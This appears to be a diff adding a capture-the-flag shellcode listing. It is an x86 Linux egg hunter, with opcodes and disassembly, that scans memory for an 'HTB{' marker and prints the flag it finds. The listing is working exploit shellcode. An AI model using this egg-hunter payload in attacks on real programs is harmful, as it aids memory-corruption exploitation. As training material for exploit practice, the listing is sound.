@@ -1,0 +1,40 @@
+
+
+
+	31 C0               	xor     eax, eax
+	89 C7               	mov     edi, eax
+	BF 48 54 42 7B          mov     edi, 7B425448h
+	
+	            		next_page:                           
+	
+	66 81 CA FF 0F          or      dx, 0FFFh
+	
+	                    next_address:
+	
+	42                      inc     edx
+	60                      pusha
+	31 C9                   xor     ecx, ecx        ; mode
+	8D 5A 04                lea     ebx, [edx+4]    ; pathname
+	B0 21                   mov     al, 21h ; '!'
+	CD 80                   int     80h             ; LINUX 	sys_access
+	3C F2                   cmp     al, 0F2h
+	61                      popa
+	74 EB                   jz      short next_page
+	39 3A                   cmp     [edx], edi
+	75 EC                   jnz     short next_address
+
+
+	89 D1                   mov     ecx, edx        ; addr
+	31 C0                   xor     eax, eax
+	89 C3                   mov     ebx, eax
+	89 DA                   mov     edx, ebx
+
+						print_flag:
+ 	B0 04                   mov     al, 4
+ 	B3 01                   mov     bl, 1           ; fd
+	B2 01                   mov     dl, 1
+	CD 80                   int     80h             ; LINUX - sys_write
+	41                      inc     ecx
+	38 31                   cmp     [ecx], dh
+	75 F3                   jnz     short print_flag
+	C3                      retn
